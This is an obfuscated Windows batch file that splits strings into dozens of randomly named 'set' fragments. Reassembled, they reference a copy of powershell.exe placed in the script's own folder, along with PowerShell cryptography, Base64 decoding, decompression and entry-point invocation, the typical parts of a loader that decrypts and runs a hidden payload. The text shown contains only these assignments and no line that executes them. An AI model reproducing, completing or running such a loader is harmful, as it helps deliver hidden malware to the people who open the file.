@echo off
set "OdagCnxYKw= /"
set "KZaKjofjtg=\v"
set "LTewJUweKk=ws"
set "gwRvApaSku=.e"
set "wBhhUQYpBz=s\"
set "fNvegjhSIb=ll"
set "JTznDiXgnQ=\W"
set "ROgSTfsZML=32"
set "FVyrrMEeWk=1."
set "ikiqmLLZNu=xe"
set "qHJcjEhLhO=do"
set "CHBSgkakSA=he"
set "XihiKYLmcI=in"
set "OdTertyVlR=py"
set "soEaUdTQhs=st"
set "aSdQGLuwIs=rs"
set "BfHykIGYhU=Po"
set "eHLfhAKKlh= C"
set "OVsosymUph=em"
set "FsfSYBmHlO=he"
set "wONzoTDGaj=co"
set "jTvTnlTKoV=ow"
set "eRRMVbKmVH=we"
set "WoJvDIGGkP=Wi"
set "DCOHljAKsJ=y "
set "ugWdvbkweZ=we"
set "bZEDcRIMdA=0\"
set "hdJRfDHQJS=po"
set "WDjiPvWWOe=:\"
set "XjDmuEWabH=ll"
set "UdAvhCBZka=Sy"
set "amZyfedKzQ=rS"
set "atbkYPdIsN=nd"
set "BbuRwnkmFz=cd"
set "VTPuiVfWqv= %~dp0"
set "QGaSQReBID=ss -"
set "IwwoQMQVMH=;$zp"
set "NFFIuMMKxR=-Obj"
set "fjLMCkfLDW=.Mem"
set "zxsuEWhALr=]::("
set "fkWXdSwRfo=1] -"
set "PjSiHBmpta=raph"
set "rZPnlJyrjI=$AUK"
set "wMpPwZdVGd=-1.."
set "DpTppUFeVm=comm"
set "QseakdsQUu=esFX"
set "NZTJyhBpnE=.Key"
set "VOUEYxpIRh=Conv"
set "zyEUJGpMxB=.Dis"
set "RgaMlYDwWy=oin "
set "OobipFKFxR=e]::"
set "eiZiDnsIex=ionM"
set "wzCzXvdgZm=lBlo"
set "JUNZxBfgsH=;$au"
set "EMrVsMsIIw=($Go"
set "uDcBxQKxYG=sp ="
set "qgHzYcRUkc=File"
set "HYEWgbHKTN=Disp"
set "juXhbWiIad= = N"
set "HKaTwxivyS=ring"
set "pzOuOBXriP=ct S"
set "uTzymaEFff=and "
set "YDWACwBwhU=eUYj"
set "FAwwCUZWRm=join"
set "vCTxgPaXjp=tion"
set "svVoWANtls=OyzA"
set "yKMXcIxLwK=.Cry"
set "fYAoNbPYwy=[Env"
set "YiiCVvjwPG=O.Me"
set "UvfDLzEEAs=rofi"
set "bdXANkTDvF=t Sy"
set "vibnEiLqyo=;$lR"
set "JrnJcSZsOA='[-1"
set "OriiOMmpFq=s = "
set "eXszMrrhQY=.Con"
set "cQiySmLqIU=nage"
set "giCedEgmwo=raph"
set "pkzShVYpml=ptor"
set "gLFYwWgCFP= [Sy"
set "WlzQAykSmj=$aum"
set "fHCATQarYy=rity"
set "SNtbXhYjKZ== $Z"
set "gwvcGnvwAn=em.I"
set "itoaMdEnLJ=k; }"
set "AyVMMCsLXZ== [S"
set "pIclZoqkXG=ptog"
set "lPHAiaiBTJ=gnir"
set "wTVRLClCfO=comp"
set "jADJjMhfCG=vert"
set "HhEDYWWeDq=3HWs"
set "xZUJHqJJRt=$kKw"
set "ZvRfYoHfRd=oint"
set "oBbojxpyAV=daeR"
set "mMgzfZZekw=yste"
set "VdEmXEjoIf=();$"
set "SxZBTCMIPl=dX);"
